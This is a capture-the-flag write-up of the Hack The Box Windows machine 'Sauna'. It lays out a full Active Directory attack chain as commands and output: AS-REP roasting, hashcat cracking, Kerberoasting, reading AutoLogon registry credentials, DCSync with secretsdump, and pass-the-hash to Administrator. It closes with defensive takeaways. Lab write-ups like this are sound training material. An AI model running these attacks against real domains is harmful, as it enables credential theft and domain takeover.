# HTB Write-Up: Sauna

| Field      | Details                                                        |
|------------|----------------------------------------------------------------|
| Platform   | [Hack The Box](https://app.hackthebox.com/machines/Sauna)      |
| Difficulty | Easy                                                           |
| OS         | Windows                                                        |
| Author     | Babayev                                                         |
| Date       | June 15, 2026                                                  |

---

## Table of Contents

1. [Reconnaissance](#1-reconnaissance)
2. [Enumeration — Username Harvesting & AS-REP Roasting](#2-enumeration--username-harvesting--as-rep-roasting)
3. [Initial Access — FSmith via WinRM](#3-initial-access--fsmith-via-winrm)
4. [Lateral Movement — Kerberoasting HSmith & Winlogon Credential Leak](#4-lateral-movement--kerberoasting-hsmith--winlogon-credential-leak)
5. [Privilege Escalation — DCSync as svc_loanmgr](#5-privilege-escalation--dcsync-as-svc_loanmgr)
6. [Summary](#6-summary)

---

## 1. Reconnaissance

Port scanning was performed with **RustScan** for fast port discovery, followed by **Nmap** for service and version fingerprinting:

```bash
rustscan -a 10.129.95.180 --ulimit 5000
```

**Open Ports:**

| Port  | Service    | Details                                              |
|-------|------------|------------------------------------------------------|
| 53    | DNS        | Simple DNS Plus                                      |
| 80    | HTTP       | Microsoft IIS httpd 10.0 — "Egotistical Bank :: Home"|
| 88    | Kerberos   | Microsoft Windows Kerberos                           |
| 135   | MSRPC      | Microsoft Windows RPC                                |
| 139   | NetBIOS    | Microsoft Windows netbios-ssn                        |
| 389   | LDAP       | Domain: `EGOTISTICAL-BANK.LOCAL`                     |
| 445   | SMB        | microsoft-ds                                         |
| 464   | kpasswd5   | tcpwrapped                                           |
| 593   | HTTP-RPC   | RPC over HTTP 1.0                                    |
| 636   | LDAPSSL    | tcpwrapped                                           |
| 3268  | LDAP GC    | Active Directory LDAP Global Catalog                 |
| 5985  | WinRM      | Windows Remote Management                            |
| 9389  | ADWS       | Active Directory Web Services                        |

The host is a **Domain Controller** running **Windows Server 2019**, domain: **`EGOTISTICAL-BANK.LOCAL`**. Port **80 (HTTP)** is notable — the web server hosts a public-facing corporate site for "Egotistical Bank," which immediately suggests potential OSINT opportunities via employee name enumeration.

No starting credentials were provided; this machine begins unauthenticated.

---

## 2. Enumeration — Username Harvesting & AS-REP Roasting

### 2.1 — Web OSINT: Employee Names from About Page

The bank's website at `http://10.129.95.180/about.html` exposed a staff directory listing employee full names. These names were collected manually and used as the input for username generation.

### 2.2 — Username Generation with username-anarchy

The collected names were fed into **username-anarchy** to generate a comprehensive list of plausible AD username formats (`fsmith`, `f.smith`, `frank.smith`, etc.):

```bash
./username-anarchy -i users > usernames
```

### 2.3 — AS-REP Roasting with impacket-GetNPUsers

With a wordlist of candidate usernames and no credentials, **AS-REP Roasting** was attempted against the domain. Accounts with **"Do not require Kerberos pre-authentication"** set will respond with an AS-REP containing an encrypted TGT portion crackable offline.

```bash
impacket-GetNPUsers EGOTISTICAL-BANK.LOCAL/ -request -usersfile usernames -dc-ip 10.129.95.180
```

**Output (truncated):**

```
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
...
$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:75614b8b385173b52e55d7022f8db632$6769b004...
```

A valid AS-REP hash was returned for **`fsmith`** — confirming the account exists and has pre-authentication disabled.

### 2.4 — Cracking the AS-REP Hash

The hash was cracked offline using **Hashcat** with rockyou.txt:

```bash
hashcat -m 18200 -a 0 hash /usr/share/wordlists/rockyou.txt
```

**Result:**

```
$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:...:Thestrokes23

Status: Cracked
Time.Started: Mon Jun 15 20:37:02 2026 (2 secs)
```

Credentials recovered:

| Account                          | Password       |
|----------------------------------|----------------|
| `EGOTISTICAL-BANK.LOCAL\fsmith`  | `Thestrokes23` |

---

## 3. Initial Access — FSmith via WinRM

### 3.1 — WinRM Validation & Shell

WinRM access was verified with **NetExec**:

```bash
nxc winrm 10.129.95.180 -u fsmith -p Thestrokes23
```

**Output:**

```
WINRM  10.129.95.180  5985  SAUNA  [+] EGOTISTICAL-BANK.LOCAL\fsmith:Thestrokes23 (Pwn3d!)
```

A shell was opened via **Evil-WinRM**:

```bash
evil-winrm -i 10.129.95.180 -u fsmith -p Thestrokes23
```

**User flag retrieved** from `\Users\FSmith\Desktop\user.txt`:

```powershell
*Evil-WinRM* PS C:\Users\FSmith\desktop> type user.txt
40e5869b4f7d198a5069e55ddf75f48f
```

Privilege check showed no immediately useful privileges (`SeMachineAccountPrivilege`, `SeChangeNotifyPrivilege` only), so enumeration continued.

### 3.2 — BloodHound Collection

BloodHound data was collected as `fsmith` to map the domain ACL graph:

```bash
bloodhound-python -u fsmith -p 'Thestrokes23' -ns 10.129.95.180 --zip -c All -d EGOTISTICAL-BANK.LOCAL
```

**Key findings from BloodHound:**

- **`HSmith`** has a registered **SPN** — making the account **Kerberoastable**.
- **`svc_loanmgr`** holds **DCSync** rights on the domain (`DS-Replication-Get-Changes-All`).

Attack path: `fsmith → (Kerberoast) hsmith → (credential hunting) svc_loanmgr → DCSync → domain`.

---

## 4. Lateral Movement — Kerberoasting HSmith & Winlogon Credential Leak

### 4.1 — Kerberoasting HSmith

BloodHound confirmed `HSmith` has a registered SPN (`SAUNA/HSmith.EGOTISTICALBANK.LOCAL:60111`). A TGS-REP hash was requested using `impacket-GetUserSPNs`.

Clock skew correction was required first:

```bash
sudo ntpdate 10.129.95.180
```

Then the TGS was requested:

```bash
impacket-GetUserSPNs EGOTISTICAL-BANK.LOCAL/fsmith:'Thestrokes23' -request -dc-ip 10.129.95.180
```

**Output:**

```
ServicePrincipalName                      Name    PasswordLastSet             LastLogon
----------------------------------------  ------  --------------------------  ---------
SAUNA/HSmith.EGOTISTICALBANK.LOCAL:60111  HSmith  2020-01-23 09:54:34.140321  <never>

$krb5tgs$23$*HSmith$EGOTISTICAL-BANK.LOCAL$EGOTISTICAL-BANK.LOCAL/HSmith*$2295d162...
```

The TGS-REP hash was saved and cracked with **Hashcat**:

```bash
hashcat -m 13100 -a 0 hash_hsmith /usr/share/wordlists/rockyou.txt
```

**Result:**

```
$krb5tgs$23$*HSmith$...:Thestrokes23

Status: Cracked
```

Credentials recovered:

| Account                          | Password       |
|----------------------------------|----------------|
| `EGOTISTICAL-BANK.LOCAL\HSmith`  | `Thestrokes23` |

Both `fsmith` and `hsmith` share the same password — a password reuse finding. A spray against `svc_loanmgr` with the same password failed, so further enumeration was needed.

### 4.2 — Winlogon AutoLogon Credential Leak via WinPEAS

**WinPEAS** was run on the `fsmith` shell for local privilege escalation and credential hunting. A critical finding appeared in the **Windows AutoLogon** registry keys under `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`:

```
DefaultDomainName    REG_SZ    EGOTISTICALBANK
DefaultUserName      REG_SZ    EGOTISTICALBANK\svc_loanmanager
DefaultPassword      REG_SZ    Moneymakestheworldgoround!
```

Credentials recovered in plaintext:

| Account                              | Password                    |
|--------------------------------------|-----------------------------|
| `EGOTISTICAL-BANK.LOCAL\svc_loanmgr` | `Moneymakestheworldgoround!` |

SMB validation confirmed the credentials:

```bash
nxc smb 10.129.95.180 -u svc_loanmgr -p 'Moneymakestheworldgoround!'
```

```
SMB  10.129.95.180  445  SAUNA  [+] EGOTISTICAL-BANK.LOCAL\svc_loanmgr:Moneymakestheworldgoround!
```

---

## 5. Privilege Escalation — DCSync as svc_loanmgr

### 5.1 — DCSync: svc_loanmgr → Domain

BloodHound showed `svc_loanmgr` holds **DCSync** (`DS-Replication-Get-Changes-All`) rights on the domain. `impacket-secretsdump` was used to dump the Administrator hash directly:

```bash
impacket-secretsdump EGOTISTICAL-BANK.LOCAL/svc_loanmgr@10.129.95.180 -just-dc-user administrator
```

**Output:**

```
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:42ee4a7abee32410f470fed37ae9660535ac56eeb73928ec783b015d623fc657
Administrator:aes128-cts-hmac-sha1-96:a9f3769c592a8a231c3c972c4050be4e
Administrator:des-cbc-md5:fb8f321c64cea87f
```

The **Administrator NT hash** was extracted: `823452073d75b9d1cf70ebdf86c7f98e`

### 5.2 — Root Flag via Pass-the-Hash

With the Administrator NT hash, a shell was opened via Evil-WinRM using Pass-the-Hash:

```bash
evil-winrm -i 10.129.95.180 -u Administrator -H 823452073d75b9d1cf70ebdf86c7f98e
```

**Root flag retrieved from `\Administrator\Desktop\root.txt`.**

---

## 6. Summary

| Phase | Technique | Result |
|-------|-----------|--------|
| Recon | RustScan + Nmap | DC identified, `EGOTISTICAL-BANK.LOCAL`, Windows Server 2019; IIS web server on port 80 noted |
| OSINT | Web scraping `about.html` | Employee full names harvested from bank staff directory |
| Username Gen | `username-anarchy` | AD-format username wordlist generated from employee names |
| AS-REP Roasting | `impacket-GetNPUsers` (no creds) | AS-REP hash for `fsmith` captured → cracked to `Thestrokes23` |
| Initial Access | Evil-WinRM as `fsmith` | WinRM shell; `user.txt` from `\FSmith\Desktop` |
| Enumeration | BloodHound + `bloodhound-python` | `HSmith` Kerberoastable; `svc_loanmgr` has DCSync rights |
| Kerberoasting | `impacket-GetUserSPNs` as `fsmith` | TGS-REP hash for `HSmith` → cracked to `Thestrokes23` (password reuse) |
| Cred Hunt | WinPEAS → Winlogon registry | `svc_loanmgr` plaintext password `Moneymakestheworldgoround!` leaked in AutoLogon keys |
| DCSync | `impacket-secretsdump` as `svc_loanmgr` | Administrator NT hash dumped |
| Root | Evil-WinRM + Pass-the-Hash | `root.txt` from `\Administrator\Desktop` |

### Key Takeaways

- **Public websites are an enumeration surface.** The "About Us" page on a corporate site exposed enough employee names to build a targeted username wordlist. On a real engagement, this is often the first step before any credential attacks.

- **AS-REP Roasting requires zero credentials.** Any account with pre-authentication disabled leaks an offline-crackable hash to an unauthenticated attacker. The `DONT_REQUIRE_PREAUTH` flag should be audited across all domain accounts and removed wherever it's not explicitly required.

- **Clock skew kills Kerberos attacks silently.** The initial Kerberoast attempt failed with `KRB_AP_ERR_SKEW` until `ntpdate` synced the attacker's clock to the DC. Always sync time before Kerberos-based attacks on HTB machines.

- **Password reuse across accounts is a force multiplier for attackers.** `fsmith` and `hsmith` sharing `Thestrokes23` means cracking one account immediately compromised the other. Enforcing unique passwords across all service and user accounts is non-negotiable.

- **AutoLogon credentials in the registry are plaintext.** The `DefaultPassword` value under `Winlogon` stored `svc_loanmgr`'s password in cleartext, readable by any local user. AutoLogon should never be configured on domain-joined machines, and especially not with privileged service accounts.

- **DCSync is game over.** Any account holding `DS-Replication-Get-Changes-All` can replicate every password hash in the domain. This right must be restricted exclusively to Domain Controllers and audited aggressively — a service account holding it is an immediate critical finding.
